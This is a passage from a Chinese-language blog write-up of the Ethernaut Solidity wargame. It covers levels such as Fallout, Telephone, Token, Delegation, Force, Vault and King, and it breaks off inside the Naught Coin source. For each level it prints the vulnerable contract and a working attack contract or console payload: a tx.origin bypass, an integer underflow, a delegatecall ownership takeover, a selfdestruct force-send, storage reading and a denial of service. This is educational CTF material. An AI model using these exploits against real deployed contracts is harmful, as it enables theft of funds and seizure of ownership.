contributions[msg.sender] &gt; <span class="number">0</span>);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;在这里，我们只需要 <strong>我 秦始皇 打钱</strong> 就可以实现fallback()的调用：  </p>
<blockquote>
<p>contract.sendTransaction({value:1});  </p>
</blockquote>
<p>&emsp;&emsp;智能合约的梗是真他喵的多 哈哈哈哈哈</p>
<hr>
<h4 id="2-Fallout"><a href="#2-Fallout" class="headerlink" title="2. Fallout"></a>2. Fallout</h4><blockquote>
<p><strong>Target</strong>: Claim ownership of the contract  </p>
</blockquote>
<p>&emsp;&emsp;这道题的出题人是真的欠揍，马德，完全是考眼力：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'zeppelin-solidity/contracts/ownership/Ownable.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract Fallout is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint) allocations;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* constructor */</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Fal1out</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">allocate</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    allocations[msg.sender] += msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sendAllocation</span>(<span class="params">address allocator</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(allocations[allocator] &gt; <span class="number">0</span>);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">collectAllocations</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">onlyOwner</span> </span>&#123;</span><br><span class="line">    msg.sender.transfer(<span class="keyword">this</span>.balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">allocatorBalance</span>(<span class="params">address allocator</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;看到没有第9行正儿八经的写着<strong>constructor</strong> 喵？定睛一看构造个瓜皮的函数，<strong>Fal1out()</strong> 这里不要被骗了，直接调用就可以了。  </p>
<blockquote>
<p>contract.Fal1out();  </p>
</blockquote>
<hr>
<h4 id="3-Coin-Flip"><a href="#3-Coin-Flip" class="headerlink" title="3. Coin Flip"></a>3. Coin Flip</h4><hr>
<h4 id="4-Telephone"><a href="#4-Telephone" class="headerlink" title="4. Telephone"></a>4. Telephone</h4><blockquote>
<p><strong>Target</strong>: 将owner变为自己  </p>
</blockquote>
<p>&emsp;&emsp;本题主要考察的是只能合约中tx.origin与msg.sender的区别，tx.origin是交易发起人，msg.sender是合约的上层调用地址。因此只需要用新合约包装一下地址就好了。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.0</span> &lt; <span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Telephone</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">changeOwner</span>(<span class="params">address _owner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (tx.origin != msg.sender) &#123;</span><br><span class="line">            owner = _owner;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack&#123;</span><br><span class="line"></span><br><span class="line">    address target = <span class="number">0x811cb74F2FC520c64f7B44ac90d056c744f0Cf4d</span>;</span><br><span class="line">    Telephone c = Telephone(target);</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hit</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">            Telephone c = Telephone(target);</span><br><span class="line">            c.changeOwner(msg.sender);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h4 id="5-Token"><a href="#5-Token" class="headerlink" title="5. Token"></a>5. Token</h4><blockquote>
<p><strong>Target</strong>: 将owner变为自己  </p>
</blockquote>
<p>&emsp;&emsp;这里主要考察uint的无符号整数的下溢,当uint为负数时，根据二进制的无符号表示法，此时数会变成一个极大的数，比如:  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uint a = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">a = a - <span class="number">2</span>;           <span class="comment">//此时a为ffffffff</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这在pwn中十分常见，因此我们可以构造payload，即:  </p>
<blockquote>
<p>contract.transfer(yourAddress,21);</p>
</blockquote>
<p>&emsp;&emsp;或者构造攻击合约：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) balances;</span><br><span class="line">    uint public totalSupply;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Token</span>(<span class="params">uint _initialSupply</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint _value</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(balances[msg.sender] - _value &gt;= <span class="number">0</span>);</span><br><span class="line">        balances[msg.sender] -= _value;</span><br><span class="line">        balances[_to] += _value;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _owner</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint balance</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> balances[_owner];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack&#123;</span><br><span class="line">    address Tokens = <span class="number">0x0c65c7ec30d5d856958707fc8b958302ae689b49</span>;</span><br><span class="line">    Token target = Token(Tokens);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hit</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        target.transfer(msg.sender,<span class="number">21</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<hr>
<h4 id="6-Delegation"><a href="#6-Delegation" class="headerlink" title="6. Delegation"></a>6. Delegation</h4><blockquote>
<p><strong>Target</strong>: 将owner变为自己  </p>
</blockquote>
<p>&emsp;&emsp;这道题主要考察的是delegatecall()相关的知识，<strong>delegatecall()</strong> 与 <strong>call()</strong> 的区别是两者的上下文不同，delegatecall()的上下文是调用方，而call()函数的上下文则是实例本身。</p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/eth_writeUp0.png?raw=true" alt="delegatecall()">  </p>
<p>&emsp;&emsp;我们来看一下合约代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Delegate</span>(<span class="params">address _owner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Delegation</span>(<span class="params">address _delegateAddress</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(delegate.delegatecall(msg.data)) &#123;</span><br><span class="line">      <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;我们可以看到<strong>Delegation</strong>的<strong>fallback</strong>函数中存在<strong>delegatecall</strong>而且其中的参数可以修改，这个时候我们可以直接调用<strong>Delegate</strong>实例的<strong>pwn()</strong>函数，payload如下：  </p>
<blockquote>
<p>contract.sendTransaction({data:web3.sha3(“pwn()”)})  </p>
</blockquote>
<p>&emsp;&emsp;这个时候我们可以看到实例直接调用了非<strong>public</strong>的<strong>pwn</strong>函数,我们就实现了修改owner的操作。</p>
<hr>
<h4 id="7-Force"><a href="#7-Force" class="headerlink" title="7. Force"></a>7. Force</h4><p>&emsp;&emsp;这一题是要你给这个合约转钱，这里除了一只噬元兽什么也没有…乍一看挺懵逼的  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Force &#123;<span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                   MEOW ?</span></span><br><span class="line"><span class="comment">         /\_/\   /</span></span><br><span class="line"><span class="comment">    ____/ o o \</span></span><br><span class="line"><span class="comment">  /~____  =ø= /</span></span><br><span class="line"><span class="comment"> (______)__m_m)         //马德 为什么这个猫变形了...</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span>&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;要想给一个地址强行转钱，我们可以让一个合约自杀，然后钱就会被强行转入别的账户而且不能拒绝。所以我们就可以写个合约，随便打点钱，然后让他当场暴毙…好生刺激。   </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Force&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract payload&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">payload</span>(<span class="params"></span>) <span class="title">payable</span></span>&#123;&#125;</span><br><span class="line">    address addr_force = <span class="number">0x0ad6047bf65c599bf68fbbc0372c3923280f2a66</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hit</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        selfdestruct(addr_force);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这样一来，一执行hit()函数payload就凉凉，然后钱就打到了Force里面了，有没有一种舔狗的感觉…  </p>
<hr>
<h4 id="8-Vault"><a href="#8-Vault" class="headerlink" title="8. Vault"></a>8. Vault</h4><blockquote>
<p><strong>Target</strong>: 解锁  </p>
</blockquote>
<p>&emsp;&emsp;这道题主要考察了如何通过<strong>web3</strong>的<strong>web3.eth.getStorageAt()</strong>接口来查看区块上的信息。 </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Vault</span>(<span class="params">bytes32 _password</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    locked = <span class="literal">true</span>;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">unlock</span>(<span class="params">bytes32 _password</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (password == _password) &#123;</span><br><span class="line">      locked = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;我们只需要通过<strong>unlock()</strong>函数就能修改locked的值，getStorageAt()的用法如下：  </p>
<blockquote>
<p>web3.eth.getStorageAt(addressHexString, position [, defaultBlock] [, callback])  </p>
</blockquote>
<p>&emsp;&emsp;我们需要使用一个回调函数来打印出相关数据：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.getStorageAt(contract.address,<span class="number">1</span>,<span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = web3.toAscii(y);</span><br><span class="line">    alert(result);</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>
<hr>
<h4 id="9-King"><a href="#9-King" class="headerlink" title="9. King"></a>9. King</h4><blockquote>
<p><strong>Target</strong>: Be a king forever!!  </p>
</blockquote>
<p>&emsp;&emsp;先放源码：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'zeppelin-solidity/contracts/ownership/Ownable.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract King is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  address public king;</span><br><span class="line">  uint public prize;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">King</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这个题目有点坑爹，他原本的目的是让你进行一次<strong>ddos</strong>攻击,在之前的版本中，我们可以使用<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="built_in">require</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> revert()</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> assert()</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;这三个函数主动抛出错误，这样一样就可以阻止<strong>transfer()</strong>的进行，但是在实施的时候我们发现这三个函数并没有阻止交易的进行，所以我们决定直接放弃编写fallback()从而进行拒绝服务攻击。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">contract fuck&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fuck</span>(<span class="params"></span>) <span class="title">payable</span></span>&#123;</span><br><span class="line">        address king_addr = <span class="number">0xc48b3899a3a594b170404855De1B0bDA2d0aec1c</span>;</span><br><span class="line">        king_addr.call.value(<span class="number">1.01</span> ether)();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gg</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        selfdestruct(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>gg()完全是为了以防钱提不出来，留个后手。  </p>
</blockquote>
<hr>
<h4 id="15-Naught-Coin"><a href="#15-Naught-Coin" class="headerlink" title="15.Naught Coin"></a>15.Naught Coin</h4><blockquote>
<p><strong>Target</strong>:取出合约中player所对应的balances  </p>
</blockquote>
<p>&emsp;&emsp;这里的balances实际上是一个token，作者重写了transfer()方法，但是他的源码不见了，我在github上找到了之前的版本：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"./BasicToken.sol"</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">"./ERC20.sol"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @title Standard ERC20 token</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @dev Implementation of the basic standard token.</span></span><br><span class="line"><span class="comment"> * https://github.com/ethereum/EIPs/issues/20</span></span><br><span class="line"><span class="comment"> * Based on code by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract StandardToken is ERC20, BasicToken &#123;</span><br><span class="line"></span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint256)) internal allowed;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * @dev Transfer tokens from one address to another</span></span><br><span class="line"><span class="comment">   * @param _from address The address which you want to send tokens from</span></span><br><span class="line"><span class="comment">   * @param _to address The address which you want to transfer to</span></span><br><span class="line"><span class="comment">   * @param _value uint256 the amount of tokens to be transferred</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transferFrom</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    address _from,</span></span></span><br><span class="line"><span class="function"><span class="params">    address _to,</span></span></span><br><span class="line"><span class="function"><span class="params">    uint256 _value</span></span></span><br><span class="line"><span class="function"><span class="params">  </span>)</span></span><br><span class="line"><span class="function">    <span class="title">public</span></span></span><br><span class="line"><span class="function">    <span class="title">returns</span> (<span class="params">bool</span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(_value &lt;= balances[_from]);</span><br><span class="line">    <span class="built_in">require</span>(_value &lt;= allowed[_from][msg.sender]);</span><br><span class="line">    <span class="built_in">require</span>(_to != address(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    balances[_from] = balances[_from].sub(_value);</span><br><span class="line">    balances[_to] = balances[_to].add(_value);</span><br><span class="line">    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);</span><br><span class="line">    emit Transfer(_from, _to, _value);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.</span></span><br><span class="line"><span class="comment">   * Beware that changing an allowance with this method brings the risk that someone may use both the old</span></span><br><span class="line"><span class="comment">   * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this</span></span><br><span class="line"><span class="comment">   * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:</span></span><br><span class="line"><span class="comment">   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729</span></span><br><span class="line"><span class="comment">   * @param _spender The address which will spend the funds.</span></span><br><span class="line"><span class="comment">   * @param _value The amount of tokens to be spent.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">approve</span>(<span class="params">address _spender, uint256 _value</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    allowed[msg.sender][_spender] = _value;</span><br><span class="line">    emit Approval(msg.sender, _spender, _value);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * @dev Function to check the amount of tokens that an owner allowed to a spender.</span></span><br><span class="line"><span class="comment">   * @param _owner address The address which owns the funds.</span></span><br><span class="line"><span class="comment">   * @param _spender address The address which will spend the funds.</span></span><br><span class="line"><span class="comment">   * @return A uint256 specifying the amount of tokens still available for the spender.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">allowance</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    address _owner,</span></span></span><br><span class="line"><span class="function"><span class="params">    address _spender</span></span></span><br><span class="line"><span class="function"><span class="params">   </span>)</span></span><br><span class="line"><span class="function">    <span class="title">public</span></span></span><br><span class="line"><span class="function">    <span class="title">view</span></span></span><br><span class="line"><span class="function">    <span class="title">returns</span> (<span class="params">uint256</span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> allowed[_owner][_spender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * @dev Increase the amount of tokens that an owner allowed to a spender.</span></span><br><span class="line"><span class="comment">   * approve should be called when allowed[_spender] == 0. To increment</span></span><br><span class="line"><span class="comment">   * allowed value is better to use this function to avoid 2 calls (and wait until</span></span><br><span class="line"><span class="comment">   * the first transaction is mined)</span></span><br><span class="line"><span class="comment">   * From MonolithDAO Token.sol</span></span><br><span class="line"><span class="comment">   * @param _spender The address which will 